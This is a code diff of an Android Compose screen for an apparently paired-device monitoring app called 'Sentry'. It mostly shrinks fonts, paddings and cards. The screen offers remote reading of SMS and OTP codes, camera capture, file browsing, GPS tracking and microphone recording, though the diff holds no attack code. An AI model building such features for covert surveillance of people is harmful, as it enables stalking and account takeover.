@@ -12,6 +12,7 @@ import androidx.compose.foundation.shape.RoundedCornerShape
 import androidx.compose.foundation.verticalScroll
 import androidx.compose.material.icons.Icons
 import androidx.compose.material.icons.automirrored.filled.ArrowBack
+import androidx.compose.material.icons.automirrored.filled.VolumeUp
 import androidx.compose.material.icons.filled.*
 import androidx.compose.material3.*
 import androidx.compose.runtime.*
@@ -98,20 +99,20 @@ fun DeviceDetailScreen(
                         Text(
                             text = deviceName,
                             fontWeight = FontWeight.ExtraBold,
-                            fontSize = 19.sp,
+                            fontSize = 18.sp,
                             maxLines = 1
                         )
                         Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.padding(top = 2.dp)) {
                             Box(
                                 modifier = Modifier
-                                    .size(8.dp)
+                                    .size(7.dp)
                                     .clip(CircleShape)
                                     .background(if (isOnline) Color(0xFF4CAF50) else Color(0xFFE53935))
                             )
-                            Spacer(modifier = Modifier.width(6.dp))
+                            Spacer(modifier = Modifier.width(5.dp))
                             Text(
                                 text = if (isOnline) "Connected • Online" else "Offline",
-                                fontSize = 12.sp,
+                                fontSize = 11.5.sp,
                                 color = if (isOnline) Color(0xFF2E7D32) else Color(0xFFC62828),
                                 fontWeight = FontWeight.Bold
                             )
@@ -129,14 +130,14 @@ fun DeviceDetailScreen(
                         Surface(
                             shape = CircleShape,
                             color = MaterialTheme.colorScheme.primaryContainer.copy(alpha = 0.5f),
-                            modifier = Modifier.size(36.dp)
+                            modifier = Modifier.size(34.dp)
                         ) {
                             Box(contentAlignment = Alignment.Center) {
                                 Icon(
                                     Icons.Default.Info,
                                     contentDescription = "Device Information",
                                     tint = MaterialTheme.colorScheme.primary,
-                                    modifier = Modifier.size(20.dp)
+                                    modifier = Modifier.size(19.dp)
                                 )
                             }
                         }
@@ -149,30 +150,30 @@ fun DeviceDetailScreen(
             modifier = Modifier
                 .fillMaxSize()
                 .padding(padding)
-                .padding(horizontal = 16.dp)
+                .padding(horizontal = 14.dp)
                 .verticalScroll(rememberScrollState())
         ) {
             // Action feedback banner
             AnimatedVisibility(visible = actionMessage != null, enter = fadeIn(), exit = fadeOut()) {
                 Surface(
                     color = Color(0xFF1E1E1E),
-                    shape = RoundedCornerShape(12.dp),
+                    shape = RoundedCornerShape(10.dp),
                     modifier = Modifier
                         .fillMaxWidth()
-                        .padding(vertical = 8.dp)
+                        .padding(vertical = 4.dp)
                 ) {
                     Row(
-                        modifier = Modifier.padding(horizontal = 14.dp, vertical = 10.dp),
+                        modifier = Modifier.padding(horizontal = 12.dp, vertical = 8.dp),
                         verticalAlignment = Alignment.CenterVertically
                     ) {
-                        Icon(Icons.Default.CheckCircle, contentDescription = null, tint = Color(0xFF4CAF50), modifier = Modifier.size(18.dp))
+                        Icon(Icons.Default.CheckCircle, contentDescription = null, tint = Color(0xFF4CAF50), modifier = Modifier.size(16.dp))
                         Spacer(modifier = Modifier.width(8.dp))
-                        Text(actionMessage ?: "", color = Color.White, fontSize = 13.sp, fontWeight = FontWeight.SemiBold)
+                        Text(actionMessage ?: "", color = Color.White, fontSize = 12.sp, fontWeight = FontWeight.SemiBold)
                     }
                 }
             }
 
-            Spacer(modifier = Modifier.height(10.dp))
+            Spacer(modifier = Modifier.height(6.dp))
 
             // Section Header
             Row(
@@ -182,108 +183,106 @@ fun DeviceDetailScreen(
             ) {
                 Text(
                     text = "Live Access & Remote Tools",
-                    style = MaterialTheme.typography.titleMedium,
                     fontWeight = FontWeight.ExtraBold,
-                    fontSize = 17.sp
+                    fontSize = 15.sp
                 )
                 Surface(
-                    shape = RoundedCornerShape(12.dp),
-                    color = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
+                    shape = RoundedCornerShape(8.dp),
+                    color = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.6f)
                 ) {
                     Text(
-                        text = "6 Features Ready",
-                        fontSize = 11.sp,
+                        text = "6 Tools Ready",
+                        fontSize = 10.5.sp,
                         fontWeight = FontWeight.Bold,
                         color = MaterialTheme.colorScheme.onSurfaceVariant,
-                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
+                        modifier = Modifier.padding(horizontal = 7.dp, vertical = 2.dp)
                     )
                 }
             }
 
-            Spacer(modifier = Modifier.height(14.dp))
+            Spacer(modifier = Modifier.height(10.dp))
 
-            // Grid of 6 interactive Feature Access Cards opening dedicated pages
-            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
-                ModernFeatureCard(
+            // Grid of 6 Compact Feature Cards (2 per row)
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                CompactFeatureCard(
                     modifier = Modifier.weight(1f),
-                    title = "Live Notifications",
-                    subtitle = "Read SMS, OTP & Chat",
+                    title = "Notifications",
+                    subtitle = "Read SMS & OTP",
                     icon = Icons.Default.NotificationsActive,
                     badgeColor = Color(0xFF1976D2),
                     onClick = onNavigateToNotifications
                 )
-                ModernFeatureCard(
+                CompactFeatureCard(
                     modifier = Modifier.weight(1f),
-                    title = "Photos & Camera",
-                    subtitle = "Remote Capture & Gallery",
+                    title = "Photos & Cam",
+                    subtitle = "Capture & Gallery",
                     icon = Icons.Default.PhotoCamera,
                     badgeColor = Color(0xFF7B1FA2),
                     onClick = onNavigateToPhotos
                 )
             }
 
-            Spacer(modifier = Modifier.height(12.dp))
+            Spacer(modifier = Modifier.height(8.dp))
 
-            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
-                ModernFeatureCard(
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                CompactFeatureCard(
                     modifier = Modifier.weight(1f),
                     title = "File Explorer",
-                    subtitle = "Browse Internal Storage",
+                    subtitle = "Browse Storage",
                     icon = Icons.Default.FolderOpen,
                     badgeColor = Color(0xFFF57C00),
                     onClick = onNavigateToFiles
                 )
-                ModernFeatureCard(
+                CompactFeatureCard(
                     modifier = Modifier.weight(1f),
                     title = "Live Location",
-                    subtitle = "GPS Satellite Tracker",
+                    subtitle = "GPS Tracker",
                     icon = Icons.Default.MyLocation,
                     badgeColor = Color(0xFF388E3C),
                     onClick = onNavigateToLocation
                 )
             }
 
-            Spacer(modifier = Modifier.height(12.dp))
+            Spacer(modifier = Modifier.height(8.dp))
 
-            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
-                ModernFeatureCard(
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                CompactFeatureCard(
                     modifier = Modifier.weight(1f),
-                    title = "Battery & Health",
-                    subtitle = "Charge Level & Temp",
+                    title = "Battery Stats",
+                    subtitle = "Level & Health",
                     icon = Icons.Default.BatteryChargingFull,
                     badgeColor = Color(0xFF00796B),
                     onClick = onNavigateToBattery
                 )
-                ModernFeatureCard(
+                CompactFeatureCard(
                     modifier = Modifier.weight(1f),
                     title = "Mic & Audio",
-                    subtitle = "Remote Voice Memo",
+                    subtitle = "Voice Memo",
                     icon = Icons.Default.Mic,
                     badgeColor = Color(0xFFC2185B),
                     onClick = onNavigateToAudio
                 )
             }
 
-            Spacer(modifier = Modifier.height(24.dp))
+            Spacer(modifier = Modifier.height(18.dp))
 
             // Quick Device Command Actions
             Text(
-                text = "Quick Device Actions",
-                style = MaterialTheme.typography.titleMedium,
+                text = "Quick Actions",
                 fontWeight = FontWeight.ExtraBold,
-                fontSize = 17.sp
+                fontSize = 15.sp
             )
 
-            Spacer(modifier = Modifier.height(12.dp))
+            Spacer(modifier = Modifier.height(8.dp))
 
             Card(
                 modifier = Modifier.fillMaxWidth(),
-                shape = RoundedCornerShape(20.dp),
+                shape = RoundedCornerShape(16.dp),
                 colors = CardDefaults.cardColors(
                     containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.35f)
                 )
             ) {
-                Column(modifier = Modifier.padding(16.dp)) {
+                Column(modifier = Modifier.padding(12.dp)) {
                     // Play Sound / Ring
                     Row(
                         modifier = Modifier
@@ -295,71 +294,71 @@ fun DeviceDetailScreen(
                                     actionMessage = null
                                 }
                             }
-                            .padding(vertical = 8.dp),
+                            .padding(vertical = 6.dp),
                         verticalAlignment = Alignment.CenterVertically
                     ) {
                         Box(
                             modifier = Modifier
-                                .size(38.dp)
-                                .clip(RoundedCornerShape(10.dp))
+                                .size(34.dp)
+                                .clip(RoundedCornerShape(8.dp))
                                 .background(Color(0xFF276EF1).copy(alpha = 0.15f)),
                             contentAlignment = Alignment.Center
                         ) {
-                            Icon(Icons.Default.VolumeUp, contentDescription = null, tint = Color(0xFF276EF1), modifier = Modifier.size(22.dp))
+                            Icon(Icons.AutoMirrored.Filled.VolumeUp, contentDescription = null, tint = Color(0xFF276EF1), modifier = Modifier.size(18.dp))
                         }
-                        Spacer(modifier = Modifier.width(14.dp))
+                        Spacer(modifier = Modifier.width(12.dp))
                         Column(modifier = Modifier.weight(1f)) {
-                            Text("Ring Device at Max Volume", fontWeight = FontWeight.Bold, fontSize = 14.sp)
-                            Text("Plays loud alert sound even if on silent mode", fontSize = 12.sp, color = MaterialTheme.colorScheme.onSurfaceVariant)
+                            Text("Ring Device at Max Volume", fontWeight = FontWeight.Bold, fontSize = 13.5.sp)
+                            Text("Plays loud alert sound even on silent mode", fontSize = 11.sp, color = MaterialTheme.colorScheme.onSurfaceVariant)
                         }
-                        Icon(Icons.Default.ChevronRight, contentDescription = null, tint = MaterialTheme.colorScheme.outline)
+                        Icon(Icons.Default.ChevronRight, contentDescription = null, tint = MaterialTheme.colorScheme.outline, modifier = Modifier.size(18.dp))
                     }
 
-                    HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.4f))
+                    HorizontalDivider(modifier = Modifier.padding(vertical = 6.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.3f))
 
                     // Unpair / Disconnect Device
                     Row(
                         modifier = Modifier
                             .fillMaxWidth()
                             .clickable { onUnpaired() }
-                            .padding(vertical = 8.dp),
+                            .padding(vertical = 6.dp),
                         verticalAlignment = Alignment.CenterVertically
                     ) {
                         Box(
                             modifier = Modifier
-                                .size(38.dp)
-                                .clip(RoundedCornerShape(10.dp))
+                                .size(34.dp)
+                                .clip(RoundedCornerShape(8.dp))
                                 .background(MaterialTheme.colorScheme.error.copy(alpha = 0.15f)),
                             contentAlignment = Alignment.Center
                         ) {
-                            Icon(Icons.Default.LinkOff, contentDescription = null, tint = MaterialTheme.colorScheme.error, modifier = Modifier.size(22.dp))
+                            Icon(Icons.Default.LinkOff, contentDescription = null, tint = MaterialTheme.colorScheme.error, modifier = Modifier.size(18.dp))
                         }
-                        Spacer(modifier = Modifier.width(14.dp))
+                        Spacer(modifier = Modifier.width(12.dp))
                         Column(modifier = Modifier.weight(1f)) {
-                            Text("Unpair Device", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = MaterialTheme.colorScheme.error)
-                            Text("Remove Sentry pairing and encryption keys", fontSize = 12.sp, color = MaterialTheme.colorScheme.onSurfaceVariant)
+                            Text("Unpair Device", fontWeight = FontWeight.Bold, fontSize = 13.5.sp, color = MaterialTheme.colorScheme.error)
+                            Text("Remove Sentry pairing and encryption keys", fontSize = 11.sp, color = MaterialTheme.colorScheme.onSurfaceVariant)
                         }
-                        Icon(Icons.Default.ChevronRight, contentDescription = null, tint = MaterialTheme.colorScheme.outline)
+                        Icon(Icons.Default.ChevronRight, contentDescription = null, tint = MaterialTheme.colorScheme.outline, modifier = Modifier.size(18.dp))
                     }
                 }
             }
 
-            Spacer(modifier = Modifier.height(28.dp))
+            Spacer(modifier = Modifier.height(20.dp))
         }
     }
 
-    // Modal Bottom Sheet / Dialog showing Device Information & Capabilities (Triggered by (i) button)
+    // Modal Bottom Sheet showing Device Information & Capabilities (Triggered by (i) button)
     if (showInfoModal) {
         ModalBottomSheet(
             onDismissRequest = { showInfoModal = false },
-            shape = RoundedCornerShape(topStart = 28.dp, topEnd = 28.dp),
+            shape = RoundedCornerShape(topStart = 24.dp, topEnd = 24.dp),
             containerColor = MaterialTheme.colorScheme.surface
         ) {
             Column(
                 modifier = Modifier
                     .fillMaxWidth()
-                    .padding(horizontal = 24.dp, vertical = 8.dp)
-                    .padding(bottom = 32.dp)
+                    .padding(horizontal = 20.dp, vertical = 8.dp)
+                    .padding(bottom = 28.dp)
                     .verticalScroll(rememberScrollState())
             ) {
                 // Header
@@ -387,24 +386,24 @@ fun DeviceDetailScreen(
                     }
                 }
 
-                Spacer(modifier = Modifier.height(16.dp))
+                Spacer(modifier = Modifier.height(14.dp))
 
                 // Device Identity Details Card
                 Card(
                     modifier = Modifier.fillMaxWidth(),
-                    shape = RoundedCornerShape(18.dp),
+                    shape = RoundedCornerShape(16.dp),
                     colors = CardDefaults.cardColors(
                         containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
                     )
                 ) {
-                    Column(modifier = Modifier.padding(16.dp)) {
+                    Column(modifier = Modifier.padding(14.dp)) {
                         Text(
                             text = deviceName,
                             fontWeight = FontWeight.ExtraBold,
-                            fontSize = 17.sp
+                            fontSize = 16.sp
                         )
 
-                        Spacer(modifier = Modifier.height(6.dp))
+                        Spacer(modifier = Modifier.height(4.dp))
 
                         // Device ID with Copy Button
                         Row(
@@ -423,25 +422,26 @@ fun DeviceDetailScreen(
                             Text(
                                 text = deviceId,
                                 fontFamily = FontFamily.Monospace,
-                                fontSize = 13.sp,
+                                fontSize = 12.5.sp,
                                 fontWeight = FontWeight.Bold,
                                 color = MaterialTheme.colorScheme.primary
                             )
                             Spacer(modifier = Modifier.width(6.dp))
-                            Icon(Icons.Default.ContentCopy, contentDescription = "Copy ID", tint = MaterialTheme.colorScheme.primary, modifier = Modifier.size(14.dp))
+                            Icon(Icons.Default.ContentCopy, contentDescription = "Copy ID", tint = MaterialTheme.colorScheme.primary, modifier = Modifier.size(13.dp))
                         }
 
-                        Spacer(modifier = Modifier.height(10.dp))
+                        Spacer(modifier = Modifier.height(8.dp))
 
                         Text(
                             text = "Platform: Android • OS: $osVersion • Sentry: 1.0.0",
                             style = MaterialTheme.typography.bodySmall,
-                            color = MaterialTheme.colorScheme.onSurfaceVariant
+                            color = MaterialTheme.colorScheme.onSurfaceVariant,
+                            fontSize = 11.5.sp
                         )
                     }
                 }
 
-                Spacer(modifier = Modifier.height(20.dp))
+                Spacer(modifier = Modifier.height(16.dp))
 
                 // Capabilities & Permissions Checklist
                 Text(
@@ -450,36 +450,36 @@ fun DeviceDetailScreen(
                     fontWeight = FontWeight.ExtraBold
                 )
 
-                Spacer(modifier = Modifier.height(10.dp))
+                Spacer(modifier = Modifier.height(8.dp))
 
                 Card(
                     modifier = Modifier.fillMaxWidth(),
-                    shape = RoundedCornerShape(18.dp),
+                    shape = RoundedCornerShape(16.dp),
                     colors = CardDefaults.cardColors(
                         containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.35f)
                     )
                 ) {
-                    Column(modifier = Modifier.padding(16.dp)) {
+                    Column(modifier = Modifier.padding(14.dp)) {
                         CapabilityRow(name = "Camera & Photos", isEnabled = cameraEnabled, icon = Icons.Default.CameraAlt)
-                        HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.3f))
+                        HorizontalDivider(modifier = Modifier.padding(vertical = 6.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.3f))
                         CapabilityRow(name = "Files & Storage", isEnabled = filesEnabled, icon = Icons.Default.Folder)
-                        HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.3f))
+                        HorizontalDivider(modifier = Modifier.padding(vertical = 6.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.3f))
                         CapabilityRow(name = "Live Notifications", isEnabled = notificationEnabled, icon = Icons.Default.Notifications)
-                        HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.3f))
+                        HorizontalDivider(modifier = Modifier.padding(vertical = 6.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.3f))
                         CapabilityRow(name = "GPS Location", isEnabled = locationEnabled, icon = Icons.Default.LocationOn)
-                        HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.3f))
+                        HorizontalDivider(modifier = Modifier.padding(vertical = 6.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.3f))
                         CapabilityRow(name = "Microphone Audio", isEnabled = micEnabled, icon = Icons.Default.Mic)
-                        HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.3f))
+                        HorizontalDivider(modifier = Modifier.padding(vertical = 6.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.3f))
                         CapabilityRow(name = "Battery & Health", isEnabled = batteryEnabled, icon = Icons.Default.BatteryFull)
                     }
                 }
 
-                Spacer(modifier = Modifier.height(20.dp))
+                Spacer(modifier = Modifier.height(18.dp))
 
                 Button(
                     onClick = { showInfoModal = false },
                     modifier = Modifier.fillMaxWidth(),
-                    shape = RoundedCornerShape(14.dp)
+                    shape = RoundedCornerShape(12.dp)
                 ) {
                     Text("Close", fontWeight = FontWeight.Bold)
                 }
@@ -489,7 +489,7 @@ fun DeviceDetailScreen(
 }
 
 @Composable
-fun ModernFeatureCard(
+fun CompactFeatureCard(
     modifier: Modifier = Modifier,
     title: String,
     subtitle: String,
@@ -500,21 +500,22 @@ fun ModernFeatureCard(
     Card(
         onClick = onClick,
         modifier = modifier,
-        shape = RoundedCornerShape(20.dp),
+        shape = RoundedCornerShape(14.dp),
         colors = CardDefaults.cardColors(
-            containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.50f)
+            containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.45f)
         ),
-        elevation = CardDefaults.cardElevation(defaultElevation = 1.dp)
+        elevation = CardDefaults.cardElevation(defaultElevation = 0.dp)
     ) {
-        Column(
+        Row(
             modifier = Modifier
                 .fillMaxWidth()
-                .padding(16.dp)
+                .padding(horizontal = 10.dp, vertical = 10.dp),
+            verticalAlignment = Alignment.CenterVertically
         ) {
             Box(
                 modifier = Modifier
-                    .size(44.dp)
-                    .clip(RoundedCornerShape(12.dp))
+                    .size(34.dp)
+                    .clip(RoundedCornerShape(8.dp))
                     .background(badgeColor.copy(alpha = 0.15f)),
                 contentAlignment = Alignment.Center
             ) {
@@ -522,23 +523,25 @@ fun ModernFeatureCard(
                     icon,
                     contentDescription = null,
                     tint = badgeColor,
-                    modifier = Modifier.size(24.dp)
+                    modifier = Modifier.size(18.dp)
                 )
             }
-            Spacer(modifier = Modifier.height(14.dp))
-            Text(
-                text = title,
-                style = MaterialTheme.typography.titleMedium,
-                fontWeight = FontWeight.Bold,
-                fontSize = 15.sp
-            )
-            Spacer(modifier = Modifier.height(3.dp))
-            Text(
-                text = subtitle,
-                style = MaterialTheme.typography.bodySmall,
-                color = MaterialTheme.colorScheme.onSurfaceVariant,
-                lineHeight = 16.sp
-            )
+            Spacer(modifier = Modifier.width(8.dp))
+            Column(modifier = Modifier.weight(1f)) {
+                Text(
+                    text = title,
+                    fontWeight = FontWeight.Bold,
+                    fontSize = 12.5.sp,
+                    maxLines = 1
+                )
+                Text(
+                    text = subtitle,
+                    style = MaterialTheme.typography.bodySmall,
+                    color = MaterialTheme.colorScheme.onSurfaceVariant,
+                    fontSize = 10.5.sp,
+                    maxLines = 1
+                )
+            }
         }
     }
 }
@@ -555,22 +558,22 @@ fun CapabilityRow(name: String, isEnabled: Boolean, icon: androidx.compose.ui.gr
                 icon,
                 contentDescription = null,
                 tint = MaterialTheme.colorScheme.primary,
-                modifier = Modifier.size(20.dp)
+                modifier = Modifier.size(18.dp)
             )
-            Spacer(modifier = Modifier.width(12.dp))
-            Text(text = name, style = MaterialTheme.typography.bodyMedium, fontWeight = FontWeight.Medium)
+            Spacer(modifier = Modifier.width(10.dp))
+            Text(text = name, style = MaterialTheme.typography.bodyMedium, fontWeight = FontWeight.Medium, fontSize = 13.sp)
         }
 
         Surface(
-            shape = RoundedCornerShape(8.dp),
+            shape = RoundedCornerShape(6.dp),
             color = if (isEnabled) Color(0xFFE8F5E9) else Color(0xFFFFEBEE)
         ) {
             Text(
                 text = if (isEnabled) "Enabled" else "Disabled",
                 color = if (isEnabled) Color(0xFF2E7D32) else Color(0xFFC62828),
-                fontSize = 11.sp,
+                fontSize = 10.5.sp,
                 fontWeight = FontWeight.Bold,
-                modifier = Modifier.padding(horizontal = 8.dp, vertical = 3.dp)
+                modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
             )
         }
     }
